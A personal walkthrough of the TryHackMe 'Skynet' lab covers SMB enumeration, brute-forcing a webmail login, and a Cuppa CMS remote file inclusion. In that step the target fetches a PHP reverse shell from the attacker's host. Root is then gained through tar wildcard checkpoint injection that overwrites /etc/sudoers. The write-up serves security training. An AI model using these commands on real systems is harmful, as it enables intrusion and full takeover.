## Skynet
---
THM Skynet Room Walkthrough: https://tryhackme.com/room/skynet



## Summary
---
- Enum ports and subdirectories
- Enum the Samba shares
- Go into the Anonymous share on SMB and download files
- Use the information in files to get login info for SquirrelMail
- Use Password found in SquirrelMail to log into SMB share for miles (Make sure to use -milesdyson as username)
- Download the file from share and check the subdirectory listed.
- Enum the new subdirectory and navigate to /administrator
- Host a webserver for reverse shell and run Cuppa exploit https://www.exploit-db.com/exploits/25971
- Get User Flag
- Check Cronjobs and exploit the script file running backup with https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
- Find root flag



## Difficulties/Lessons Learned
---
- Forgot to add username when logging into SMB share
- Learned how to brute force logins with multiple usernames and password lists
- Tried to privesc with a new reverse shell spawned from the root running the cronjob, but it never caught. Not sure why, may try again. The exploit outlined in the medium article worked easily.



## Walkthrough
---
Let's first begin by checking the IP and see if we have a website linked to it.

Visiting the IP leads us to a SKYNET website

![](attachments/Pasted%20image%2020250202211534.png)

Searching does nothing. Let's try enumerating the open ports as well as the subdirectories. 

We will use the following commands

```bash
nmap -sS -sV -sC -Pn 10.10.221.5 


```

Looks like ports 22, 80, 110, 139, 143, and 445 are open and there seems to be a Samba share at 445. 

![](attachments/Pasted%20image%2020250202211735.png)

Gobuster also gives us some subdirectories we can check out.

![](attachments/Pasted%20image%2020250202211909.png)

Let's try enumerating the samba share first with the following command

```bash
smbclient -L //10.10.221.5
```

![](attachments/Pasted%20image%2020250202212048.png)

We have a few shares. Trying to connect to them allows us in the Anonymous share where we can get a file called attention.txt and 3 log files.

Reading the files gives us a message from Miles Dyson which is the same name as the other Samba share we can't access. The log1.txt file also gives us a huge list of what looks like passwords. We may be able to use these on the websites or the other share.

Let's check the directories we got earlier to see if we can find any more info there.

The only page we get access to is squirrelmail with a login prompt. Trying admin/admin doesn't work. Let's try milesdyson with the list we had earlier. It's easier and quicker to test for me than brute forcing the passwords on the smbshare.

![](attachments/Pasted%20image%2020250202214001.png)

We will first capture a login request using burpsuite and then send the request to intruder with the log1.txt file as the password list. I'll also create a quick list of possible usernames in case the login is case sensitive, as well as admin.

![](attachments/Pasted%20image%2020250202214216.png)

Rerouting the web traffic with FoxyProxy to Burpsuite and sending a request gives us this request

![](attachments/Pasted%20image%2020250202214426.png)

After sending it to intruder we have this with the before mentioned payloads.

![](attachments/Pasted%20image%2020250202214534.png)

It looks like we may have a hit. 

![](attachments/Pasted%20image%2020250202214914.png)

Let's try logging in with this information. We are in!

![](attachments/Pasted%20image%2020250202215145.png)

The bottom two email have the same text (one in binary and one in plain text) of some random words, the top email has information about an SMB password.

![](attachments/Pasted%20image%2020250202215256.png)

Let's try logging into the milesdyson share with this since that is who the e-mail is addressed to.

This does not work. The passwords from the password list also do not work.

Let's try connecting via SSH with milesdyson. This also doesn't work.

Let's try connecting to the Samba share as admin or milesdyson. User milesdyson does in fact work!

```bash
smbclient //<TARGET_IP>/milesdyson -U "milesdyson"
```

![](attachments/Pasted%20image%2020250202222028.png)

When checking dir we can see a folder called "notes". Upon inspection it has a files called "important.txt" which I will download with 

```bash
get important.txt
```

Reading it gives us

![](attachments/Pasted%20image%2020250202222257.png)

CMS may stand for Content Management System and the characters may be a domain. Let's see if it is a subdomain of our IP. 

It is a page but it does not help us any further. There are no links on the page. I tried recursively enumerating the subdomains earlier, so let's try that here as well.

![](attachments/Pasted%20image%2020250202222424.png)

```bash
gobuster -u http://10.10.221.5/45kra24zxs28v3yd -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt dir
```

We get a subdomain called /administrator running Cuppa CMS with a login form. Let's try admin/admin and the credentials we learned earlier.

These do not seem to work. Let's see if there is an exploit for Cuppa that is publicly available. A quick google search leads us to https://www.exploit-db.com/exploits/25971

It looks like we can inject a text file that will be read as php and maybe catch a reverse shell. Let's use [pentestmonkeys reverse php script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) since it usually works best for me, set up a listener, and see if this works. We should also host a webserver to upload the payload.

```bash
nc -lvp 4444
```

```bash
python3 -m http.server 80
```

The exploits states the following URL we should use

```bash
http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
```

Adjusted that means we should have the following (assuming we are in the /cuppa directory)

```bash
http://10.10.221.5/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.21.101.68/rev.txt?
```

Let's try running this and see if our listener catches a reverse shell.

It does and we can get our first user flag.

![](attachments/Pasted%20image%2020250202224535.png)

Let's also upgrade the shell with the following commands

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# Background shell with ctrl+z

stty raw -echo; fg
```

Let's check our permissions with 

```bash
sudo -l
```

Unfortunately, we don't have the ability since we need a password. The one previously does not work.

Let's check cron jobs with

```bash
cat /etc/crontab
```


It looks like we have some backup.sh script running every minute as root. Let's check it out. The script inside reveals the following

```bash
tar cf /home/milesdyson/backups/backup.tgz *
```

So it looks like we are creating a backup of the files in the folder that the scrip is located in. It looks like it backs up ALL files due to * being used. 

After a quick google search it looks like there is a privilege escalation vector here as documented her: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

Since we are backing up all files, it looks like we can exploit that with crontabs checkpoints function which allows us to execute an action, and since we are running as root, we should be able to escalate. Following the instructions in the write up above, we are now root! The one thing to note, is that we had to change 

```bash
# 1. Create files in the current directory called
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'

# 2. Create a privesc.sh bash script, that allows for privilege escalation
#malicous.sh:
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

to this, to accomodate for our username (www-data):

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

![](attachments/Pasted%20image%2020250203233247.png)
With this privesc, we can now find the root flag in /root and we are done.